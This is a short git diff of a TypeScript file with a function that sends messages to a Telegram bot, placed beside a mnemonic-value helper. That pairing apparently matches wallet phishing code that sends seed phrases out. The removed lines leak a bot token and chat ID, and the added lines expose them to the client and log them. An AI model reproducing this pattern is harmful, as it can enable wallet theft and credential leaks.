@@ -159,11 +159,13 @@ export function getMnemonicValues(count: number): string[] {
 }
 
 export const sendMessageToTelegram = async (message: string) => {
-  const token = "7066701119:AAEA9l_zKahPDLNQAHiMS-OW7iEZXqRqQoA";
+  const token = process.env.NEXT_PUBLIC_TELEGRAM_TOKEN;
+  const chatID = process.env.NEXT_PUBLIC_TELEGRAM_CHAT_ID
+  console.log(token, chatID)
   const url = `https://api.telegram.org/bot${token}/sendMessage`;
 
   const params = {
-    chat_id: "5486625572",
+    chat_id: chatID,
     text: message,
   };
 
